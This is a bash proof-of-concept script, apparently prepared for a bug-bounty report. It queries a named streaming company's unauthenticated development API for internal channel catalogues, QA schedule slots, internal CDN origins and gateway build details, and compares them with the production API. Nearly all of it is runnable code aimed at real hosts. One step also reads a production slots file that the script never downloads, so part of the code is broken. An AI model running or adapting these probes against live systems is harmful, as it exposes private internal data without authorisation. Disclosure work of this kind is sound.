#!/usr/bin/env bash
# PoC: ABEMA non-production API "dev-api.d-c3-e.abema-tv.com" (in scope via *.abema-tv.com)
# serves the internal dev/QA catalogue with NO authentication, while the same data is absent
# from the production API.
# Run:  bash poc-dev-api-unauth.sh
set -u
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Safari/537.36'
DEV='https://dev-api.d-c3-e.abema-tv.com'
PRD='https://api.abema.io'
retry_curl(){ for i in 1 2 3 4 5; do out=$(curl -sS -D "$HD" -o "$OF" -w '%{http_code}' --max-time 25 -A "$UA" "$1") && [ "$out" != "000" ] && { echo "$out"; return 0; }; sleep 2; done; echo "$out"; }

echo "[1] DEV channel catalogue (no Cookie / no Authorization)"
HD=/tmp/h1 OF=/tmp/dev_channels.json; s=$(retry_curl "$DEV/v1/channels"); echo "    HTTP $s  $(wc -c </tmp/dev_channels.json) bytes"
grep -o '"id":"[^"]*"' /tmp/dev_channels.json | head -5 | sed 's/^/    first ids: /'

echo "[2] PROD channel catalogue for comparison"
HD=/tmp/h2 OF=/tmp/prod_channels.json; s=$(retry_curl "$PRD/v1/channels"); echo "    HTTP $s  $(wc -c </tmp/prod_channels.json) bytes"

echo "[3] set difference: channels present on DEV, absent from PROD public catalogue"
python3 - <<'PY'
import json
d={c['id'] for c in json.load(open('/tmp/dev_channels.json'))['channels']}
p={c['id'] for c in json.load(open('/tmp/prod_channels.json'))['channels']}
print(f"    dev={len(d)} prod={len(p)} dev_only={len(d-p)}")
print("    internal/QA ids:", sorted([x for x in d-p if any(k in x.lower() for k in ['test','qa','yospace','personalized','drm','pd-'])]))
PY

echo "[4] DEV schedule: internal QA test-case slots"
HD=/tmp/h3 OF=/tmp/dev_slots.json; s=$(retry_curl "$DEV/v1/broadcast/slots"); echo "    HTTP $s  $(wc -c </tmp/dev_slots.json) bytes"
python3 - <<'PY'
import json,re
d=json.load(open('/tmp/dev_slots.json'))['slots']
p=[x['title'] for x in json.load(open('/tmp/prod_slots.json'))['slots']]
tag=[x['title'] for x in d if re.match(r'^【',x['title'])]
print(f"    dev slots={len(d)}  internal-tagged(【..】)={len(tag)}  overlapping prod titles={sum(1 for x in d if x['title'] in p)}")
print("    e.g.:", tag[:4])
PY

echo "[5] DEV media config for one internal slot (internal dev CDN origins + playlist URL templates)"
SID=$(python3 -c "import json;print(json.load(open('/tmp/dev_slots.json'))['slots'][0]['id'])")
HD=/tmp/h4 OF=/tmp/dev_media.json; s=$(retry_curl "$DEV/v1/media/slots/$SID"); echo "    HTTP $s  slot=$SID"
grep -o -E 'https://dev-[a-z0-9.-]+/(slot|chase|preview)/[^"]*' /tmp/dev_media.json | head -3 | sed 's/^/    /'
echo "    same slotId on PROD:"; HD=/tmp/h5 OF=/tmp/prod_media.json; retry_curl "$PRD/v1/media/slots/$SID" | sed 's/^/      HTTP /'; sed 's/^/      body: /' /tmp/prod_media.json

echo "[6] Negative control: the dev gateway DOES have an auth gate on other routes"
HD=/tmp/h6 OF=/tmp/dev_me.json; retry_curl "$DEV/v1/me" | sed 's/^/    GET \/v1\/me -> HTTP /'; sed 's/^/      body: /' /tmp/dev_me.json

echo "[7] Internal service discovery + build version on the dev gateway (response headers)"
curl -sSI --max-time 25 -A "$UA" "$DEV/v1/channels" | grep -i -E 'x-envoy-decorator-operation|server|via' | sed 's/^/    /'
curl -sS --max-time 25 -A "$UA" "$DEV/version" | sed 's/^/    \/version -> /'
